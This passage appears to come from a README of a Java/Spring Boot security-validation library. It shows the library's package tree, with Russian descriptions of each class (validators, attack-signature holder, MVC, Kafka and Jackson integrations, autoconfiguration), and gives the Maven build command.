├── SecureDto                     — аннотация класса
├── SecureField                   — настройки поля
├── DateTimeRange                 — диапазон даты поля
├── SecurityCheck                 — перечень проверок
├── SecureValidator               — обход объекта и проверки
├── ThreatPatterns                — сигнатуры атак и нормализация строк
├── Violation                     — описание нарушения
├── SecurityValidationException   — исключение со списком нарушений
├── web
│   ├── ValidatingArgumentResolversPostProcessor — подключение проверки параметров контроллеров
│   ├── ValidatingArgumentResolver — обёртка штатного resolver'а
│   └── SecureParameterException  — исключение для HTTP 400
├── kafka
│   ├── ValidatingListenerPostProcessor — прокси для бинов со слушателями
│   ├── ValidatingListenerInterceptor — проверка аргументов слушателя
│   └── SecureMessageException    — исключение без повторной доставки
├── jackson
│   ├── SecureValidationModule    — Jackson-модуль (+ harden())
│   ├── ValidatingDeserializer    — обёртка десериализатора
│   └── ValidatingSerializer      — обёртка сериализатора
└── autoconfigure
    ├── SecureValidationAutoConfiguration — автоконфигурация Spring Boot
    ├── SecureWebMvcAutoConfiguration — автоконфигурация для контроллеров
    ├── SecureKafkaAutoConfiguration — автоконфигурация для Kafka
    └── SecureValidationProperties — свойства sbernpf.secure-validation
```

Сборка и тесты: `mvn clean install`.
